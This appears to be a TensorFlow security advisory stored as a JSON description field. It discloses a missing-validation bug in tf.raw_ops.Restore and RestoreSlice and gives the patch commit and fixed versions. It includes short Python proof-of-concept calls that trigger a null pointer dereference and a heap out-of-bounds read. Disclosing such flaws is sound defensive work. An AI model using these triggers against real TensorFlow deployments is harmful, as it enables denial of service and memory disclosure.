    "Description": "### Impact\nWhen restoring tensors via raw APIs, if the tensor name is not provided, TensorFlow can be tricked into dereferencing a null pointer:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.Restore(\n  file_pattern=['/tmp'],\n  tensor_name=[], \n  default_value=21,\n  dt=tf.int,\n  preferred_shard=1)\n```\n  \nThe same undefined behavior can be triggered by `tf.raw_ops.RestoreSlice`:\n  \n```python\nimport tensorflow as tf\n\ntf.raw_ops.RestoreSlice(\n  file_pattern=['/tmp'],\n  tensor_name=[], \n  shape_and_slice='2',\n  dt=inp.array([tf.int]),\n  preferred_shard=1)\n```\n\nAlternatively, attackers can read memory outside the bounds of heap allocated data by providing some tensor names but not enough for a successful restoration:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.Restore(\n  file_pattern=['/tmp'],\n  tensor_name=['x'], \n  default_value=21,\n  dt=tf.int,\n  preferred_shard=42)\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/47a06f40411a69c99f381495f490536972152ac0/tensorflow/core/kernels/save_restore_tensor.cc#L158-L159) retrieves the tensor list corresponding to the `tensor_name` user controlled input and immediately retrieves the tensor at the restoration index (controlled via `preferred_shard` argument). This occurs without validating that the provided list has enough values.\n\nIf the list is empty this results in dereferencing a null pointer (undefined behavior). If, however, the list has some elements, if the restoration index is outside the bounds this results in heap OOB read.\n\n### Patches \nWe have patched the issue in GitHub commit [9e82dce6e6bd1f36a57e08fa85af213e2b2f2622](https://github.com/tensorflow/tensorflow/commit/9e82dce6e6bd1f36a57e08fa85af213e2b2f2622).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
